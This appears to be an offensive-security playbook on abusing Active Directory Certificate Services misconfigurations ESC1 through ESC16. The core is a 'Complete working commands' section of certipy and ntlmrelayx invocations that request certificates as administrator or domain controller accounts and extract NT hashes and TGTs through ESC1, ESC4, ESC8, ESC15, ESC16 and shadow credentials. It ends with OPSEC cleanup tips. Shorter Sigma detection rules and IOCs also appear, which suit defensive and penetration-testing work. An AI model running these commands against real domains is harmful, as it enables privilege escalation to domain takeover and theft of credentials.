# AD CS Abuse — ESC1 through ESC16

ATT&CK: T1649 (Steal or Forge Authentication Certificates), T1557.001 (relay to ADCS),
T1556 (Modify Authentication Process). CWE-295 (Improper Certificate Validation),
CWE-269 (Improper Privilege Management), CWE-732 (Incorrect Permission Assignment on templates).

## Theory / Mechanism

AD CS issues X.509 certificates usable for PKINIT Kerberos auth. Misconfigured templates / CA
settings let an unprivileged enrollee obtain a certificate that authenticates as a high-value
principal (arbitrary SAN/UPN, or injected client-auth EKU). The ESC catalog (SpecterOps "Certified
Pre-Owned" + later research) now spans **ESC1-ESC16**, fully tooled in **Certipy v5**.

## ESC catalog (current)

| ESC | Condition | Primitive |
|-----|-----------|-----------|
| ESC1 | Template: enrollee supplies subject (SAN) + client-auth EKU | Request cert as any UPN |
| ESC2 | Any-Purpose / no EKU | Cert usable for any purpose |
| ESC3 | Enrollment Agent EKU | Request on behalf of others |
| ESC4 | Write/GenericAll over a template | Reconfigure → ESC1, then restore |
| ESC6 | `EDITF_ATTRIBUTESUBJECTALTNAME2` on CA | SAN injection regardless of template |
| ESC7 | ManageCA / ManageCertificates rights | Enable templates, approve, ESC6-style |
| ESC8 | HTTP/RPC enrollment + no EPA | **NTLM relay** to CA → cert as relayed machine |
| ESC9 | Template `CT_FLAG_NO_SECURITY_EXTENSION` | No SID security ext → mapping bypass |
| ESC10 | Weak cert mapping (`StrongCertificateBindingEnforcement`/`UseSubjectAltName`) | Bypass with attacker cert |
| ESC11 | IF_ENFORCEENCRYPTICERTREQUEST off (RPC enrollment) | Relay over RPC (ICPR) |
| ESC13 | Issuance policy OID linked to a privileged group | Enroll → auto group membership |
| ESC15 | **EKUwu / CVE-2024-49019** — Schema v1 template, EKU not sanitized | Inject client-auth EKU + SAN |
| ESC16 | **CA-wide** disable of SID security extension (like ESC9 globally) | Domain-wide mapping bypass |

## Modern 2024-2026 variants (verified)

- **ESC15 / EKUwu — CVE-2024-49019 (patched Nov 2024)**: V1 schema templates (e.g. WebServer)
  fail to sanitize the requested **Application Policies / EKU**, so an attacker injects the
  *Client Authentication* (1.3.6.1.5.5.7.3.2) or *Certificate Request Agent* EKU plus a custom SAN —
  yielding a Kerberos-auth cert as Administrator from a template never meant for client auth.
- **ESC16**: same missing-SID-security-extension flaw as ESC9 but set **globally on the CA**
  (`szOID_NTDS_CA_SECURITY_EXT` / OID 1.3.6.1.4.1.311.25.2 disabled CA-wide) → all issued certs lack
  the SID binding, enabling mapping bypass against any account.
- **Feb 2025 Full Enforcement**: DCs moved to `StrongCertificateBindingEnforcement` Full Enforcement —
  pure Certifried (CVE-2022-26923) SAN spoofing no longer authenticates alone; chain via ESC9/ESC16.
- **Server 2025 Web Enrollment** ships **EPA enabled by default** → breaks classic ESC8 on new installs.
- **Certipy v5 (2025)** added ESC9-ESC16 support in `find`/`req`.

## Complete working commands

### Find vulnerable templates / CA
```bash
certipy find -u user@corp.local -p 'Pass' -dc-ip <DC_IP> -vulnerable -stdout
certipy find -u user@corp.local -p 'Pass' -dc-ip <DC_IP> -enabled -json -output adcs   # full inventory
```
> `scripts/adcs_esc_finder.py` parses Certipy JSON and classifies ESC1/2/3/4/6/9/15/16 with the exact
> follow-on command for each finding.

### ESC1 — enrollee-supplied SAN
```bash
certipy req -u user@corp.local -p 'Pass' -dc-ip <DC_IP> -ca CORP-CA -template VulnTemplate \
  -upn administrator@corp.local -sid <ADMIN_SID>
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>        # -> NT hash + TGT
```

### ESC15 / EKUwu (CVE-2024-49019) — inject EKU on a V1 template
```bash
# Inject Client Authentication EKU + SAN on a Schema-v1 template (e.g. WebServer)
certipy req -u user@corp.local -p 'Pass' -dc-ip <DC_IP> -ca CORP-CA -template WebServer \
  -upn administrator@corp.local -application-policies 'Client Authentication'
# If full enforcement blocks UPN, use the schannel/LDAP path:
certipy req -u user@corp.local -p 'Pass' -ca CORP-CA -template WebServer \
  -application-policies 'Certificate Request Agent'
certipy auth -pfx administrator.pfx -dc-ip <DC_IP> -ldap-shell
```

### ESC16 — CA-wide SID-extension override
```bash
# Verify CA is missing the security extension globally (certipy find shows "ESC16")
# Then request as a victim and authenticate; mapping bypass applies domain-wide
certipy req -u user@corp.local -p 'Pass' -ca CORP-CA -template User -upn dc01\$@corp.local
certipy auth -pfx 'dc01.pfx' -dc-ip <DC_IP>
```

### ESC4 — template ACL abuse (reconfigure → ESC1 → restore)
```bash
certipy template -u user@corp.local -p 'Pass' -template VulnTemplate -save-old -dc-ip <DC_IP>   # make ESC1
# ... perform ESC1 request as above ...
certipy template -u user@corp.local -p 'Pass' -template VulnTemplate -configuration VulnTemplate.json  # restore
```

### ESC8 — relay to CA HTTP (no EPA)
```bash
impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# coerce DC (see coercion-relay.md), then:
certipy auth -pfx dc01.pfx -dc-ip <DC_IP>
```

### Shadow credentials (Key Trust) — GenericWrite over target
```bash
certipy shadow auto -u attacker@corp.local -p 'Pass' -account 'TARGET$' -dc-ip <DC_IP>
# (adds msDS-KeyCredentialLink, gets TGT via PKINIT, UnPAC-the-hash for NT hash, removes link)
```

## Detection

```yaml
title: ADCS Anomalous Certificate Issuance (arbitrary SAN / EKU injection)
logsource: { product: windows, service: security }
detection:
  issue: { EventID: 4887 }                  # certificate issued/approved
  reqsan: { Attributes|contains: ['SAN:upn','san:upn','1.3.6.1.5.5.7.3.2'] }
  condition: issue and reqsan
level: high
---
title: Certificate Authentication for High-Value Principal
logsource: { product: windows, service: security }
detection:
  sel: { EventID: 4768, CertIssuerName|exists: true, TargetUserName|contains: ['admin','krbtgt','$'] }
  condition: sel
level: high
```
IOCs: 4886/4887 issuance for templates that rarely issue; certs with mismatched
subject vs requester; client-auth EKU on a WebServer (V1) template (ESC15); PKINIT (4768 with
`Certificate Information`) for Administrator/DC$; CA event 4899/4900 (template/CA setting changed).

## OPSEC

- Restore any template you modify (ESC4) — keep the `-save-old` JSON.
- Issued certs persist in the CA database (revocable by defenders); note serial for the report.
- ESC8 relay creates issuance events on the CA tied to the relayed machine — expect EDR/SIEM hits.
- After Feb 2025 Full Enforcement, prefer ESC9/ESC15/ESC16 chains over bare SAN spoofing.
- Clean shadow-credential KeyCredentialLink after UnPAC-the-hash.

## References
- SpecterOps — "Certified Pre-Owned" (Schroeder & Christensen) + ly4k/Certipy wiki "06 - Privilege Escalation"
- TrustedSec / Justin Bollinger — ESC15 EKUwu (CVE-2024-49019)
- HackingArticles — "ADCS ESC15 — Exploiting Template Schema v1"; xbz0n.sh — "ESC1 to ESC16"
- Microsoft KB5014754 (Certifried CVE-2022-26923, certificate mapping enforcement timeline)
